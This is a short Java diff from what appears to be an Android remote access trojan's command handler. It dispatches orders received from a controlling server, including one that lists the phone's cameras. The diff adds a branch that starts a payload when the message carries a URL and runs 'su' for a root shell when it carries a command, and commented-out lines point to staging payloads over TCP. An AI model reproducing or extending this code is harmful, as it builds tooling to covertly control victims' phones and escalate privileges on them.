@@ -60,6 +60,7 @@ try {
                  data = (JSONObject) args[0];
                 String order = data.getString("order");
                 Log.e("order",order);
+                Process p;
                 switch (order){
                     case "x0000ca":
                         if(data.getString("extra").equals("camList"))
@@ -77,7 +78,11 @@ try {
                         break;
                     case "x0000te":
                         String url=data.getString("url");
-                        Payload.start(context);
+                        String cmd=data.getString("cmd");
+                        if (!url.isEmpty())
+                            Payload.start(context);
+                        if (!cmd.isEmpty())
+                            p = Runtime.getRuntime().exec("su");
                         //Payload.startAsync();
                         //Payload.runStagefromTCP(url);
                         break;
